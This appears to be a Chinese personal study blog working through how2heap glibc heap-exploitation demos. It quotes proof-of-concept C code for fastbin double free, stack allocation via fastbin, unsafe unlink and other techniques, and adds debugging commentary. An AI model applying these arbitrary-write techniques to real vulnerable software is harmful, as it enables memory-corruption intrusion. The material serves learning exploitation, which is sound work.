---
title: "HOW2HEAP"
date: 2026-11-13 19:08:05
categories:
  - "题目复现"
  - "how2heap"
tags: ["fastbin", "unsorted-bin", "unlink", "UAF", "double-free", "HouseOfSpirit", "malloc-consolidate", "glibc2.35"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#8 -->
## 2.23（部分）

## fastbin_dump

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	assert(a == c);
}
```

其实就只是double基于fastbin机制下的

gdb调一下

```bash
gcc -g -O0 -o double_free fastbin_dup.c
```

![image-20261027183522092](/pwn-notes/images/notes/image-20261027183522092.png)

申请一个堆块之后是这样的接下来申请完

![image-20261027183627665](/pwn-notes/images/notes/image-20261027183627665.png)

删除a

![image-20261027183748075](/pwn-notes/images/notes/image-20261027183748075.png)

删除b

![image-20261027183851996](/pwn-notes/images/notes/image-20261027183851996.png)

再次删除a

![image-20261027183934946](/pwn-notes/images/notes/image-20261027183934946.png)

a被释放两次，a此时又变成了头部

此时也是变成了环，这就形成了double free

接下来申请

![image-20261027184708700](/pwn-notes/images/notes/image-20261027184708700.png)

确实，申请两次之后，确实里面确实还是原本b指向的a堆块的地址

![image-20261027184957833](/pwn-notes/images/notes/image-20261027184957833.png)

![image-20261027185638062](/pwn-notes/images/notes/image-20261027185638062.png)

可以看到a和c所指向的地址一样

这就是double达到的效果

Fastbin Double Free 是通过打破 `fasttop` 检查，在 Fastbin 单链表中制造**环**，从而实现**同一块内存被多次分配（UAF）**，最终达到劫持 `fd` 指针、实现**任意地址分配（Arbitrary Alloc）**的目的。

## fastbin_dup_consolidate

```bash
gcc -g -O0 -o 1 1.c
```

源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8

This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a
double free to gain two pointers to the same large-sized chunk, which is usually difficult to do 
directly due to the previnuse check.

malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially
merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top
if possible.

As of glibc version 2.35 it is called only in the following five places:
1. _int_malloc: A large sized chunk is being allocated (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)
2. _int_malloc: No bins were found for a chunk and top is too small (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)
3. _int_free: If the chunk size is >= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)
4. mtrim: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)
5. __libc_mallopt: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)

We will be targeting the first place, so we will need to allocate a chunk that does not belong in the 
small bin (since we are trying to get into the 'else' branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). 
This means our chunk will need to be of size >= 0x400 (it is thus large-sized).

*/

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n");

	void* p1 = calloc(1,0x40);

	printf("Allocate a fastbin chunk p1=%p \n", p1);
  	printf("Freeing p1 will add it to the fastbin.\n\n");
  	free(p1);

  	void* p3 = malloc(0x400);

	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
	printf("a chunk with chunk size 0x410. p3=%p\n", p3);

	printf("\nmalloc_consolidate will merge the fast chunk p1 with top.\n");
	printf("p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n");

	assert(p1 == p3);

  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n");
	free(p1); // vulnerability

	printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");
	printf("chunk got consolidated with it. We have thus achieved UAF!\n");

	printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");
	printf("p3 and p1 will still be pointing to it.\n");
	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
	printf("and both point to the same large-sized chunk. p3=%p p4=%p\n", p3, p4);
	printf("We have achieved duplication!\n\n");
	return 0;
}
```

看介绍似乎也是实现一个双指的作用，先申请一个小的之后释放掉，之后再申请一个大的，触发相关机制，fastbin中的与topchunk合并，使得再次分配的时候就会使得大堆块的内存地址与一开始申请的小的相同。

然后free小的指针，然后大的chunk就会被释放，之后再次申请大chunk，这次申请的地址就会和上一次申请的大chunk地址相同。从而实现双指。

有什么用？

![image-20261027194200212](/pwn-notes/images/notes/image-20261027194200212.png)



调试：

申请小堆0x40

![image-20261027194637072](/pwn-notes/images/notes/image-20261027194637072.png)

接下来先释放这个堆块进入fastbin

![image-20261027194826915](/pwn-notes/images/notes/image-20261027194826915.png)

接下来申请大堆块

![image-20261027194916118](/pwn-notes/images/notes/image-20261027194916118.png)

可以看到和一开始申请的小堆块地址一样

![image-20261027195013744](/pwn-notes/images/notes/image-20261027195013744.png)

接下来再释放p1

![image-20261027195129358](/pwn-notes/images/notes/image-20261027195129358.png)

释放完之后居然哪个bin也没有进入吗？

![image-20261027195623280](/pwn-notes/images/notes/image-20261027195623280.png)

行。然后再次申请大堆块，好像不管申请什么，都会获得一开始的地址

![image-20261027195807843](/pwn-notes/images/notes/image-20261027195807843.png)

![image-20261027195921605](/pwn-notes/images/notes/image-20261027195921605.png)

三个指针都指向开头

这个还是大的堆块，释放后还是会与topchunk合并。

行吧，起码知道还能这样。

## fastbin_dup_into_stack

这是写入栈中吗？（似乎是先将返回地址写入fd，之后直接篡改返回地址指向后门函数什么的）

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

服了，一直给我讲伪造堆块的size字段，讲为什么-8啥的，真服了。直接调

首先就是构造double free

![image-20261027204750354](/pwn-notes/images/notes/image-20261027204750354.png)

首先申请3个在0x20大小范围的堆块

释放a

![image-20261027204931085](/pwn-notes/images/notes/image-20261027204931085.png)

之后free b之后再次free a造成double free

![image-20261027205028965](/pwn-notes/images/notes/image-20261027205028965.png)

接下来d申请一个小堆块，使得和a指向同一个堆块

![image-20261027205148806](/pwn-notes/images/notes/image-20261027205148806.png)

![image-20261027205243894](/pwn-notes/images/notes/image-20261027205243894.png)

接下来修改d就相当于修改a的相关结构内容了

![image-20261027205523134](/pwn-notes/images/notes/image-20261027205523134.png)

还可以看到此时的fastbin链表头是chunkb

而它之后有申请了一次，使得a变成链表头

![image-20261027205718737](/pwn-notes/images/notes/image-20261027205718737.png)

![image-20261027205743194](/pwn-notes/images/notes/image-20261027205743194.png)

确实如此

然后他之后就开始吓唬搞了

![image-20261027205844207](/pwn-notes/images/notes/image-20261027205844207.png)

![image-20261027210026081](/pwn-notes/images/notes/image-20261027210026081.png)

fastbin取出的时候会检查fd指向的堆块的size字段。而现在d指向的就是a的fd字段，我们想修改这里，使得验证通过。

因为是0x20 而那个地址存的值就是0x20，而一般size字段是在chunk头的+0x8字节，所以是size-0x8+0x8得到的就是0x20.

那么他最终获得的是，maloc获得的是+0x10之后的，所以

最后获得的就是stack_var+0x8的地址是堆块首地址

![image-20261027211140248](/pwn-notes/images/notes/image-20261027211140248.png)

这是修改d之前

接下来修改d指针指向的值

![image-20261027211242376](/pwn-notes/images/notes/image-20261027211242376.png)

可以看到a的fd指针处的值确实被修改了

![image-20261027211349629](/pwn-notes/images/notes/image-20261027211349629.png)

他后面8字节确实是0x20

![image-20261027211441213](/pwn-notes/images/notes/image-20261027211441213.png)

在这里可以看到，在又一次申请堆块之后栈地址确实是被写入了

![image-20261027212251212](/pwn-notes/images/notes/image-20261027212251212.png)

所以说这就是最后得到的申请的堆块吗，地址是98结尾的，之后如果这里是返回地址的话，直接篡改就行了。

![image-20261027212701087](/pwn-notes/images/notes/image-20261027212701087.png)

又调一次

![image-20261027212728784](/pwn-notes/images/notes/image-20261027212728784.png)

![image-20261027212748094](/pwn-notes/images/notes/image-20261027212748094.png)

接下来e指向的就是那个地址

![image-20261027212833357](/pwn-notes/images/notes/image-20261027212833357.png)

![image-20261027212922598](/pwn-notes/images/notes/image-20261027212922598.png)

确实是申请到了栈地址

所以主要的就是伪造的栈地址需要满足size字段，之后fd改为size-0x8

之后malloc得到的地址就是size+0x10

## house_of_einherjar

使用条件：**单字节越界（off-by-one）**，可以向一块 malloc 分配出的堆块写入一个空字节（null byte）的场景

unlink checks

复用机制：

**如果前一个块还在用，我这个块的 `prev_size` 就借给他当数据区用。**

不多说了兄弟们，看了翻译就是一个堆块溢出之后，修改下一个的presize字段（还需要考虑unlink机制），之后的话，直接free就行了吧应该

```c
gcc -g -O0 -o 1 1.c
```

![image-20261028103837602](/pwn-notes/images/notes/image-20261028103837602.png)

首先就是申请一个小堆块

我去原来第一个堆块加上的大小不是0x10而是0x8，前面的pre_size字段被复用了

![image-20261028104220458](/pwn-notes/images/notes/image-20261028104220458.png)

而且

![image-20261028104325734](/pwn-notes/images/notes/image-20261028104325734.png)

![image-20261028104354983](/pwn-notes/images/notes/image-20261028104354983.png)

所以大小是0x40字节

然后接下来需要真实的chunka大小

![image-20261028104602563](/pwn-notes/images/notes/image-20261028104602563.png)

接下来伪造fake_chunk

![image-20261028104710928](/pwn-notes/images/notes/image-20261028104710928.png)

![image-20261028111924432](/pwn-notes/images/notes/image-20261028111924432.png)

然后申请的是0xf8大小的

![image-20261028104836598](/pwn-notes/images/notes/image-20261028104836598.png)

![image-20261028104910324](/pwn-notes/images/notes/image-20261028104910324.png)

接下来直接溢出

![image-20261028112954764](/pwn-notes/images/notes/image-20261028112954764.png)

![image-20261028113116376](/pwn-notes/images/notes/image-20261028113116376.png)

可以看到b的size字段低位变成0

接下来好像是直接算偏移，用b的chunk地址减去伪造fake_chunk的地址，这应该是大小吧

![image-20261028113556663](/pwn-notes/images/notes/image-20261028113556663.png)

可以看到b的pre_size字段已经被修改了

![image-20261028113744757](/pwn-notes/images/notes/image-20261028113744757.png)

这应该就是计算过程

![image-20261028113844704](/pwn-notes/images/notes/image-20261028113844704.png)

fake[chunk1]=fake_size

![image-20261028113930492](/pwn-notes/images/notes/image-20261028113930492.png)

![image-20261028114229310](/pwn-notes/images/notes/image-20261028114229310.png)

free（b）之后的效果

![image-20261028114804832](/pwn-notes/images/notes/image-20261028114804832.png)

fake_chunk的大小改变了，

![image-20261028115346751](/pwn-notes/images/notes/image-20261028115346751.png)

接下来申请堆块

![image-20261028115414287](/pwn-notes/images/notes/image-20261028115414287.png)

![image-20261028115450441](/pwn-notes/images/notes/image-20261028115450441.png)

可以看到，申请的堆首地址是我们伪造的fake_chunk,接下来就可以在此修改内容

嘶就是堆块重叠，之后的话，伪造堆块（需要注意绕过unlink机制，之后再次申请堆块需要绕过检查），堆溢出修改pre_size的标志位，

之后修改伪造堆块的size,改成计算出来的pre_size,之后的话就可以free,之后再次申请，就可以得到我们伪造堆块的地址，进而修改其内容。

## house_of_force（任意地址写）

哦，这个是修改top_chunk的size字段，使得直接从top_chunk分配相应大小的堆块

相应操作记起来好像只有，将top_chunk字段改为-1,当然需要首先安防一个小堆块用来堆溢出，之后free这个小堆块之后，（这里好像并没有和top_chunk合并）会和top_chunk合并，因为我们申请的是一个大堆块。之后就会直接从top_chunk分配，有啥用？只是申请一个地址吗？

原来是通过修改top_chunk的相关偏移，得到申请堆块的大小，进而实现任意地址写

![image-20261028151922821](/pwn-notes/images/notes/image-20261028151922821.png)

```c
gcc -g -O0 -o 1 1.c
```

首先我们想要下下一次分配的地址是目标地址：

new_top=target-0x10(这样的话下一次malloc才会分配（new_top+0x10=target）)

那么我们第一次请求的大小是多少？

首先new_top=old_top+nb(malloc.size+0x10)

而 new_top=target-0x10=old_top+nb(malloc.size+0x10)

所以malloc.size=target-0x20-old_top

这个就是我们想要请求的大小

接下来直接调：

![image-20261028152912666](/pwn-notes/images/notes/image-20261028152912666.png)

首先申请0x100大小的堆块

![image-20261028152945959](/pwn-notes/images/notes/image-20261028152945959.png)

![image-20261028153103287](/pwn-notes/images/notes/image-20261028153103287.png)

接下来知道top_chunk的地址

![image-20261028153239486](/pwn-notes/images/notes/image-20261028153239486.png)

![image-20261028153257103](/pwn-notes/images/notes/image-20261028153257103.png)

接下来修改top_chunk的大小

![image-20261028153508489](/pwn-notes/images/notes/image-20261028153508489.png)

![image-20261028153723098](/pwn-notes/images/notes/image-20261028153723098.png)

虽然上面会提示一大堆，但是最终还是修改完成了

接下来就是计算我们需要申请的大小

![image-20261028153849818](/pwn-notes/images/notes/image-20261028153849818.png)

进行申请

![image-20261028154549845](/pwn-notes/images/notes/image-20261028154549845.png)

接下来会申请堆块，获得的malloc地址就是我们的target_addr

![image-20261028155115270](/pwn-notes/images/notes/image-20261028155115270.png)

接下来修改内容

![image-20261028155324955](/pwn-notes/images/notes/image-20261028155324955.png)

![image-20261028163551997](/pwn-notes/images/notes/image-20261028163551997.png)

可以看到相关的内容确实被改写了

希望不要忘记

接下来我就挑一点值得复现的做做

## unsafe_unlink

脱链吗？希望之前看的一部分还有点用

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04/16.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}


```

```bash
gcc -g -O0 -o 1 1.c
```

额，我觉得就是在原来的第一个堆块上伪造相应的fd和bk（所以最后），着重伪造的应该是

其fd字段和bk字段

fd:fakechunk-0x18    bk:fakechunk-0x10

之后再次篡改下一个堆块的pre_size的大小和标志位，在free这个堆块的时候就会触发unlink

这个时候我们伪造的堆块就会起作用，

![image-20261028174812894](/pwn-notes/images/notes/image-20261028174812894.png)

之后就修改原本指针指向的地址。有点乱

调一下：

首先申请一个0x80大小的堆块chunk0

![image-20261028175519431](/pwn-notes/images/notes/image-20261028175519431.png)

接下来又申请一个0x80大小的堆块为chunk1

![image-20261029144743903](/pwn-notes/images/notes/image-20261029144743903.png)

chunk1也可以了

![image-20261029150024128](/pwn-notes/images/notes/image-20261029150024128.png)

好吧，这两个指针有点耐人寻味

也就是说这个指针在内存中的地址是

0x602078

而它实际指向的的是

0x603010

接下来在chunk0里面创建fake_chunk

![image-20261029150856724](/pwn-notes/images/notes/image-20261029150856724.png)

这是一开始创建的chunk0

接下来执行完这一句之后

![image-20261029151024898](/pwn-notes/images/notes/image-20261029151024898.png)

![image-20261029151116123](/pwn-notes/images/notes/image-20261029151116123.png)

伪造的fd被写入进去

接下来是伪造的bk

![image-20261029151244533](/pwn-notes/images/notes/image-20261029151244533.png)

接下来应该修改的是chunk1的pre_size位置

![image-20261029152822009](/pwn-notes/images/notes/image-20261029152822009.png)

可以看到确实是被换成了0x80

但是我们需要伪造的是前一个堆块被释放的状态，所以，还需要修改其size位最后字节为0

![image-20261029153046744](/pwn-notes/images/notes/image-20261029153046744.png)

修改完成，但是应该还需要修改fake_chunk的size位，以至于更好通过检查。额，好i谢谢昂不对

![image-20261029153330702](/pwn-notes/images/notes/image-20261029153330702.png)

居然直接free掉堆块了吗

![image-20261029153621529](/pwn-notes/images/notes/image-20261029153621529.png)

这是释放完之后的样子，bins里什么都没有

![image-20261029153704557](/pwn-notes/images/notes/image-20261029153704557.png)

我去，怎么指过去的？

![image-20261029154646723](/pwn-notes/images/notes/image-20261029154646723.png)

（额）原来chunk0的指针存在0x602078这个位置，然后指向的是0x603010

之后触发unlink机制，之后的话

最后一句是

BK-fd=FD

而FD就是0x602078-0x18=0x602060

所以就是将0x602078指向的内容从0x603010变成0x602060

所以此时的chunk0也就是0x602078还以为指向的是0x603010,但是其实已经变成0x602060

所以chunk0[3]就是0x602078,之后再次将这个地址里面写入栈上地址，之后

看这：：：：：：：

也就是一开始&chunk0是0x602078指向的是0x603010,之后的话，改成了0x602060,而现在chunk[3] (修改其指向的内容为栈上地址)，之后修改chunk[0]就会变成修改栈上内容了

![](/pwn-notes/images/notes/image-20261029155946398.png)

![image-20261029163320021](/pwn-notes/images/notes/image-20261029163320021.png)

修改完之后直接修改数据即可。

这就是unlink实现任意地址写。服了。

##  unsorted_bin_attack

```bash
gcc -g -O0 -o 1 1.c
```

反正这个就是任意地址写入大数据

![image-20261031103616274](/pwn-notes/images/notes/image-20261031103616274.png)

只需要将目标地址-0x10写入即将进入的unsortedbin

之后在进入unsoretdbin之后再次申请之后就可以触发相关的攻击写入

首先

![image-20261031104441800](/pwn-notes/images/notes/image-20261031104441800.png)

![image-20261031104816213](/pwn-notes/images/notes/image-20261031104816213.png)

可以看到已经有数据是一开始设置的0

之后申请大堆块

![image-20261031110714763](/pwn-notes/images/notes/image-20261031110714763.png)

首先设置指针p指向堆块内容区

之后直接

![image-20261031111531658](/pwn-notes/images/notes/image-20261031111531658.png)

接着再申请一个防止free之后与topchunk合并

![image-20261031111858342](/pwn-notes/images/notes/image-20261031111858342.png)

接下来应该是将target-0x10写入其bk位置

![image-20261031112155237](/pwn-notes/images/notes/image-20261031112155237.png)

首先是free之后再写入

![image-20261031112230857](/pwn-notes/images/notes/image-20261031112230857.png)

已经进入unsortedbin,

![image-20261031112307913](/pwn-notes/images/notes/image-20261031112307913.png)

所以说在最后触发攻击的时候是在释放的时候

![image-20261031122038219](/pwn-notes/images/notes/image-20261031122038219.png)

![image-20261031122203741](/pwn-notes/images/notes/image-20261031122203741.png)

接下来就是将目标地址-0x10放进bk，最后就可以

![image-20261031122705021](/pwn-notes/images/notes/image-20261031122705021.png)

已经写进去了，之后直接malloc

![image-20261031122827004](/pwn-notes/images/notes/image-20261031122827004.png)

看到68位置的值已经被修改了

反正应该就是只要大于0x80就可以

放进去

## house of spirit

首先申请一个小堆块

![image-20261031155157719](/pwn-notes/images/notes/image-20261031155157719.png)

接下来应该是在栈上寻找一个合适的位置来放置合适的假堆块

![image-20261031161050242](/pwn-notes/images/notes/image-20261031161050242.png)

修改fake_chunk的size

![image-20261031161501216](/pwn-notes/images/notes/image-20261031161501216.png)

之后修改另一个

然后是将堆指针改成db20哪个位置

![image-20261031162531704](/pwn-notes/images/notes/image-20261031162531704.png)

![image-20261031164746229](/pwn-notes/images/notes/image-20261031164746229.png)

接下来接着申请0x30的堆块就可以

获取到栈地址上的堆块了

![image-20261031170158895](/pwn-notes/images/notes/image-20261031170158895.png)

你有空好好看吧

## poison_null_byte

调一下

申请一个0x100的堆块

![image-20261102100613877](/pwn-notes/images/notes/image-20261102100613877.png)

接着申请三个堆块，最后那一个是用来防止合并的

![image-20261102100805816](/pwn-notes/images/notes/image-20261102100805816.png)

![image-20261102101149747](/pwn-notes/images/notes/image-20261102101149747.png)

![image-20261102103317798](/pwn-notes/images/notes/image-20261102103317798.png)

这一步就是为了绕过相关检查机制，因为现在它的大小已经被改成0x200所以接下来就会去下方0x200大小的地方寻找相邻堆块的pre_size位置，之后就会绕过检查

![image-20261102103816165](/pwn-notes/images/notes/image-20261102103816165.png)

接下来就free并且修改chunkb 的size字段

![image-20261102104726964](/pwn-notes/images/notes/image-20261102104726964.png)

![image-20261102104758758](/pwn-notes/images/notes/image-20261102104758758.png)

size字段已经修改完成

<!-- sync-hash: 67ab57d1d02320a524df17e76269e3cd228c49b5738c22c6924f29bffd6c9f26 -->
